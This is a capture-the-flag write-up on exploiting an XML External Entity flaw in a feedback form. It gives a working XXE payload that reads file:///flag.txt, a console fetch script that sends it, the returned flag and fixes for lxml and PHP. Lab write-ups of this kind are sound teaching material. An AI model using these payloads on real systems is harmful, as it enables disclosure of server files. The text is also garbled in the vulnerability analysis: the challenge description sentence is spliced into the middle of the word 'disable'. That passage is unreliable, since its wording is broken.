---
title: "CTF Write-up: Bad Feedback"
date: 2025-12-16
---

**Category:** Web Security / Injection
**Vulnerability:** XML External Entity (XXE) Injection

## 1\. Challenge Description

The challenge features a customer feedback form that claims to accept feedback "at face value." The goal is to read a flag file stored on the server's root directory.

> *Description: "Every feedback is accepted at face value, no questions asked. What can go wrong? Flag is in the root."*

## 2\. Reconnaissance

Inspecting the HTML source code revealed how the frontend processes the form data. A script intercepts the form submission and manually constructs an XML payload string before sending it to the `/feedback` endpoint via `fetch`.

```javascript
// Vulnerable Client-Side Logic
const xml =`<?xml version="1.0" encoding="UTF-8"?>
<feedback>
    <name>${name}</name>
    <message>${message}</message>
</feedback>`;
```

This confirms two things:

1.  The backend expects **XML** data (Content-Type: `application/xml`).
2.  The structure implies the backend parses this XML to display the "Thank you" message.

## 3\. Vulnerability Analysis

The phrase "accepted at face value" suggests the backend XML parser does not sanitize input or disa
The challenge features a customer feedback form that claims to accept feedback "at face value." The goal is to read a flag file stored on the server's root directory.
ble **External Entities**.

**The Mechanism:**
In standard XML, you can define a custom "Entity" (like a variable) inside a `DOCTYPE` header. If the parser is insecure, it will process a `SYSTEM` identifier, which can tell the parser to "replace this variable with the contents of this local file."

We need to inject a `<!DOCTYPE>` header to define an entity (e.g., `&flag;`) pointing to `file:///flag.txt`, and then reference that entity in the `<name>` tag so the server returns the file content in the response.

## 4\. Exploitation

**The Payload:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<feedback>
    <name>&flag;</name>
    <message>XXE Exploit</message>
</feedback>
```

This script must be executed in the Console (F12) *while on the challenge page* to ensure the request originates from the same domain, avoiding CORS/Same-Origin errors.

```javascript
const xxe_xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feedback_data [ <!ENTITY flag SYSTEM "file:///flag.txt"> ]>
<feedback><name>&flag;</name><message>XXE attempt</message></feedback>`;

fetch('/feedback', {
    method: 'POST',
    headers: { 'Content-Type': 'application/xml' },
    body: xxe_xml
})
.then(resp => resp.text())
.then(html => {
    document.open(); document.write(html); document.close();
});
```

**Server Response:**

```html
<h2>Thank you for your feedback!</h2>
<p><strong>Name:</strong> ClOuDsEk_ReSeArCH_tEaM_CTF_2025{b3e0b6d2f1c1a2b4d5e6f71829384756}</p>
```

## 5\. Conclusion & Remediation

We retrieved the flag by exploiting the server's insecure XML configuration.

**The Fix:**
The application developers must disable External Entity loading in the XML parser configuration.

  * **Python (`lxml`):** `parser = etree.XMLParser(resolve_entities=False)`
  * **PHP:** `libxml_disable_entity_loader(true);`
  
**Flag:** `ClOuDsEk_ReSeArCH_tEaM_CTF_2025{b3e0b6d2f1c1a2b4d5e6f71829384756}`
